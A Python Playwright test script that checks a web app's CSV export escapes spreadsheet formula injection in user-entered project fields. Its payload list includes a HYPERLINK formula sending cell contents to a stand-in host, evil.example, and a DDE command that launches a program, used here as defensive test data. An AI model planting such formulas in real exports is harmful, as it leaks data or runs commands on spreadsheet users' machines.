#!/usr/bin/env python3
"""Export safety: a cell in a spreadsheet is not a safe place for user text.

The portfolio CSV exists to be opened in Excel by a governance committee, and
every field in it is typed by whoever owns a project. Excel, LibreOffice and
Sheets treat a leading =, +, - or @ as a formula, quoted or not.

    pixi run test-exports
"""

from __future__ import annotations

import sys
from pathlib import Path

from playwright.sync_api import sync_playwright

APP = Path(__file__).resolve().parent.parent / "docs" / "app" / "index.html"

PAYLOADS = [
    '=HYPERLINK("https://evil.example/?x="&A1,"Review status")',
    "=1+1",
    "+1+1",
    "-1+1",
    "@SUM(A1)",
    "=cmd|'/c calc'!A0",
    "\tleading tab",
]

failures: list[str] = []


def check(name: str, condition: bool, detail: str = "") -> None:
    if condition:
        print(f"  ok    {name}")
    else:
        print(f"  FAIL  {name}{(' -- ' + detail) if detail else ''}")
        failures.append(name)


def main() -> int:
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        page.goto(APP.as_uri())
        page.wait_for_timeout(400)

        for payload in PAYLOADS:
            cell = page.evaluate("v => csvField(v)", payload)
            check(
                f"defanged: {payload[:28]!r}",
                cell.startswith("\"'"),
                f"got {cell[:40]!r}",
            )
            # The original text must still be there, just inert.
            check(
                f"preserved: {payload[:28]!r}",
                payload.replace('"', '""') in cell,
                f"got {cell[:60]!r}",
            )

        for benign in ["Sepsis early warning", "St Elsewhere", "", "0.94", "n/a"]:
            cell = page.evaluate("v => csvField(v)", benign)
            check(
                f"untouched: {benign!r}",
                cell == f'"{benign}"',
                f"got {cell!r}",
            )

        # Quote doubling must still happen, defanged or not.
        check(
            "quotes still doubled",
            page.evaluate("""() => csvField('say "hi"')""") == '"say ""hi"""',
        )
        check(
            "null and undefined become empty",
            page.evaluate("() => csvField(null) + csvField(undefined)") == '""""',
        )

        # And the real export must carry it through.
        page.evaluate(
            """() => {
                PROJECTS = new Map([["x", normalize(Object.assign(
                    blankProject("=HYPERLINK(\\"https://evil\\",\\"x\\")"),
                    {id:"x"}))]]);
            }"""
        )
        csv = page.evaluate("() => exportCSV()")
        check(
            "exportCSV() defangs the project name",
            "\"'=HYPERLINK" in csv,
            csv.splitlines()[1][:60] if len(csv.splitlines()) > 1 else csv[:60],
        )
        browser.close()

    print()
    if failures:
        print(f"{len(failures)} check(s) failed")
        return 1
    print("export checks passed")
    return 0


if __name__ == "__main__":
    sys.exit(main())
